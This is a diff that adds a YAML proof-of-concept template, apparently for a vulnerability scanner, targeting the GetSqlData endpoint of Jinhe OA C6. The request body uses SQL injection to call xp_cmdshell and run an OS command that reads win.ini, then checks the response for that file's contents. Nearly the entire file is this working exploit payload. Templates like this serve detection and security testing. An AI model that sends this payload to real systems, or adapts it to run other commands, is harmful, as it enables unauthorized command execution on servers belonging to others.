@@ -1,0 +1,17 @@
+id: poc-yaml-jinhe-C6-GetSqlData-sql-injection
+info:
+  name: 金和OA-C6-GetSqlData-SQL注入
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 金和OA
+requests:
+- method: POST
+  path: /C6/Control/GetSqlData.aspx/.ashx
+  data: 'exec master..xp_cmdshell ''type C:\windows\win.ini''
+
+    '
+  expression: status_code == 200 && (contains(body, "for 16-bit app support") || contains(body,
+    "[extensions]"))
+variables: {}
+transport: http
